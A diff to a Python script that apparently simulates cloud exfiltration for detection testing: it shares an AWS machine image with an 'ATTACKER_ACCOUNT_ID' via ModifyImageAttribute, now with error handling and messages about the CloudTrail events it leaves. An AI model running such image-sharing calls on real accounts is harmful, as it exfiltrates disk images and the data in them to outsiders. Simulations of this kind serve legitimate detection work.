@@ -136,12 +136,19 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
     shared = False
     try:
         banner("Step 1 - Share the AMI with an external account (ModifyImageAttribute)")
-        ec2.modify_image_attribute(
-            ImageId=ami_id,
-            LaunchPermission={"Add": [{"UserId": ATTACKER_ACCOUNT_ID}]},
-        )
-        shared = True
-        print(f"  [+] {ami_id} launch permission granted to {ATTACKER_ACCOUNT_ID}")
+        try:
+            ec2.modify_image_attribute(
+                ImageId=ami_id,
+                LaunchPermission={"Add": [{"UserId": ATTACKER_ACCOUNT_ID}]},
+            )
+            shared = True
+            print(f"  [+] {ami_id} launch permission granted to {ATTACKER_ACCOUNT_ID}")
+        except ClientError as exc:
+            # AMIs backed by snapshots encrypted with the default aws/ebs key
+            # (EBS encryption by default) cannot be shared.
+            print(f"  [~] AWS refused the share: {exc.response['Error']['Code']}: "
+                  f"{exc.response['Error']['Message']}")
+            print("  [~] The attempt is still recorded in CloudTrail (errorCode set).")
         print("  [!] CloudTrail event: ec2:ModifyImageAttribute")
 
         banner("Step 2 - Verify the share (DescribeImageAttribute)")
